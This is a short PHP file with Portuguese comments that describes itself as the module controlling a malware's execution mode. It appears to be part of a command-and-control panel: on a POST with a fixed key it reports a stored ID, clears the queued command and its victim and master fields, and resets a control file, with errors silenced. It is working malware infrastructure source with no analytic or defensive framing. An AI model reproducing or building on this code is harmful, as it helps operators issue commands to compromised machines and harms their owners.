<?php
error_reporting(0);
//
// Módulo responsável por controlar modo de execução do Malware...
//
if(isset($_POST["87324"])){
	
	$MDXINI = parse_ini_file("CTL.ini", 'MDX');
	$ID = $MDXINI['MDX']['ID'];
	
	printf($ID);
	
	// Já executou o comando então setá em arquivos que não tem mais comandos...
	$buf = "[UID]\nUID=\nMASTER=\n\n[CMD]\nCMD=";
	$arq = fopen("../../databases/cmd.ini", "w");
	$grx = fwrite($arq, $buf);	
	
	$buf = "[MDX]\nID=1";
	$arq = fopen("CTL.ini", "w");
	$grx = fwrite($arq, $buf);	
}
?>
